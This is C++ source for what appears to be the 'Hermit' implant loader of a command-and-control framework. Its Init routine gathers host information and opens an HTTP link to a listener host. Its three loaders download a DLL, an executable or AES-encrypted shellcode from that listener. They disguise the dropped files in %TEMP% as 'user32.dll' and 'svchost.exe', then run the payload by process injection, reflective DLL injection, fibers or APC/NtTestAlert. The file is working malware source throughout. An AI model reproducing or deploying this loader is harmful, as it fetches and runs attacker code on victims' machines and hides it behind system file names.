#include "hermit.hpp"

namespace Hermit
{
    State::PSTATE Init()
    {
        // Load modules for dynamac API resolution.
        HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
        if (!hNTDLL)
        {
			return nullptr;
        }

        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
        if (!hWinHTTPDLL)
        {
			FreeLibrary(hNTDLL);
            return nullptr;
        }
    
        State::PSTATE pState = new State::STATE;

		pState->pCrypt				        = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
		// pState->pTeb 				        = NtCurrentTeb();
		pState->hNTDLL				        = hNTDLL;
		pState->hWinHTTPDLL			        = hWinHTTPDLL;
		pState->pProcs 				        = Procs::FindProcs(hNTDLL, hWinHTTPDLL, FALSE);
		// pState->pSyscalls			        = Syscalls::FindSyscalls(hNTDLL);
		pState->lpPayloadType 		        = PAYLOAD_TYPE_W;
		pState->lpPayloadTechnique 		    = PAYLOAD_TECHNIQUE_W;
        pState->lpPayloadProcessToInject    = PAYLOAD_PROCESS_TO_INJECT_W;
		// pState->bIndirectSyscalls	        = bIndirectSyscalls;
		pState->lpListenerProto 	        = LISTENER_PROTOCOL_W;
		pState->lpListenerHost 		        = LISTENER_HOST_W;
		pState->nListenerPort 		        = LISTENER_PORT;
		pState->lpReqPathDownload 	        = REQUEST_PATH_DOWNLOAD_W;
		pState->hSession 			        = NULL;
		pState->hConnect 			        = NULL;
		pState->hRequest 			        = NULL;
		// pState->pSocket 			        = NULL;

		// Get system information
		Handler::GetInitialInfoJSON(pState);

		Handler::HTTPInit(pState);
		if (pState->hSession == NULL || pState->hConnect == NULL)
		{
			State::Free(pState);
			return nullptr;
		}

        return pState;
    }

    VOID DLLLoader()
    {
        State::PSTATE pState = Init();
        if (!pState)
        {
            return;
        }

        BOOL bResults = FALSE;

        // Set the temp file path
        std::wstring dllFileName = L"user32.dll"; // Impersonate the file name.
        std::wstring dllPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + dllFileName;
        size_t dwDllPathSize = (dllPath.size() + 1) * sizeof(wchar_t);

        // Download a DLL file
        bResults = System::Http::DownloadFile(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            L"Content-Type: application/json\r\n",
            std::wstring(pState->lpInfoJSON),
            dllPath
        );
        if (!bResults)
        {
            State::Free(pState);
            return;
        }

        // Target PID
        DWORD dwPID;

        // Inject DLL
        if (wcscmp(pState->lpPayloadTechnique, L"dll-injection") == 0)
        {
            dwPID = System::Process::GetProcessIdByName(pState->lpPayloadProcessToInject);
            Technique::Injection::DLLInjection(pState->pProcs, dwPID, (LPVOID)dllPath.c_str(), dwDllPathSize);
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"reflective-dll-injection") == 0)
        {
            Technique::Injection::ReflectiveDLLInjection(pState->pProcs, dllPath.c_str(), dwDllPathSize);
        }

        State::Free(pState);
        return;
    }

    VOID ExecLoader()
    {
        State::PSTATE pState = Init();
        if (!pState)
        {
            return;
        }

        BOOL bResults = FALSE;

        // Set the temp file path
        std::wstring execFileName = L"svchost.exe"; // Impersonate the file name.
        std::wstring execPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + execFileName;

        // Download an executable
        bResults = System::Http::DownloadFile(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            L"Content-Type: application/json\r\n",
            std::wstring(pState->lpInfoJSON),
            execPath
        );
        if (!bResults)
        {
            State::Free(pState);
            return;
        }

        // Execute
        if (wcscmp(pState->lpPayloadTechnique, L"direct-execution") == 0)
        {
            System::Process::ExecuteFile(pState->pProcs, execPath);
        }

        State::Free(pState);
        return;
    }

    VOID ShellcodeLoader()
    {
        State::PSTATE pState = Init();
        if (!pState)
        {
            return;
        }

        BOOL bResults = FALSE;

        std::string sInfoJSON = Utils::Convert::UTF8Encode(std::wstring(pState->lpInfoJSON));

        // Download shellcode
        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJSON.c_str(),
            (DWORD)strlen(sInfoJSON.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            State::Free(pState);
            return;
        }


        std::wstring wEnc = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
        if (wEnc.length() == 0)
        {
            State::Free(pState);
            return;
        }

        Stdout::DisplayMessageBoxW(wEnc.c_str(), L"ShellcodeLoader wEnc");

        // Decrypt the data
        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pState->pCrypt->pAES->hKey, pState->pCrypt->pAES->iv);

        // Target PID
        DWORD dwPID;

        // Inject shellcode
        if (wcscmp(pState->lpPayloadTechnique, L"shellcode-injection") == 0)
        {
            dwPID = System::Process::GetProcessIdByName(pState->lpPayloadProcessToInject);
            Technique::Injection::ShellcodeInjection(pState->pProcs, dwPID, bytes);
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-fibers") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaFibers(pState->pProcs, bytes);
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-apc-and-nttestalert") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(pState->pProcs, bytes);
        }

        State::Free(pState);
        return;
    }
}
